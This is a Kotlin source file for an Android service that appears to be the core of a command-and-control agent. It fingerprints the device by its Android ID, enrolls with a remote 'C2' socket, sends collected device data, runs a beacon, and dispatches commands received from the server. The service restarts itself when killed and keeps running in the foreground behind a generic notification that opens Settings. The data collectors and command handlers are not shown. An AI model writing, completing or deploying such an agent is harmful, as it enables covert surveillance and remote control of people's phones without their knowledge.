package ai.bixtx.agent

import ai.bixtx.agent.collectors.DataCollectors
import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings

class AgentService : Service() {

    private lateinit var socket:     C2Socket
    private lateinit var beacon:     Beacon
    private lateinit var dispatcher: CommandDispatcher
    private lateinit var collectors: DataCollectors

    override fun onCreate() {
        super.onCreate()

        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        collectors = DataCollectors(applicationContext)
        socket     = C2Socket(deviceId)
        beacon     = Beacon(socket, collectors)
        dispatcher = CommandDispatcher(applicationContext, socket, collectors)

        socket.onCommand = { type, payload ->
            dispatcher.dispatch(type, payload)
        }
        socket.onConnect = {
            socket.send("ENROLL", mapOf(
                "enrollKey"    to Config.ENROLL_KEY,
                "deviceId"     to deviceId,
                "platform"     to Config.PLATFORM,
                "agentVersion" to Config.AGENT_VERSION,
            ) + collectors.snapshot())
        }

        startForeground(Config.NOTIFICATION_ID, buildNotification())
        socket.connect()
        beacon.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Restart if killed by the OS
        return START_STICKY
    }

    override fun onDestroy() {
        beacon.stop()
        socket.disconnect()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── Notification (required for foreground service on Android 8+) ──────────
    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(Settings.ACTION_SETTINGS),
            PendingIntent.FLAG_IMMUTABLE
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, Config.CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }

        return builder
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE)
                }
            }
            .build()
    }
}
